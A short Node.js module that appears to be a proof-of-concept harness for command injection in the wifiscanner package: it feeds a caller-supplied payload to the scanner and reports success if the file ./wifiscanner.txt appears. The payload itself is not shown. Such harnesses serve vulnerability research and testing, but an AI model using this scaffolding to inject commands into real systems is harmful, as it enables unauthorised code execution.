function exploitFunction(payload) {
  const fs = require("fs");
  let wifiscanner = require("wifiscanner");
  const sleep = require("sleep");
  const path = "./wifiscanner.txt";

  try {
    let scanner = wifiscanner(payload);
    scanner.scan(function (error, networks) {});
  } catch (error) {
    console.log(error);
  }

  sleep.sleep(2);
  let file_exist = fs.existsSync(path);
  return file_exist;
}

module.exports = { exploitFunction };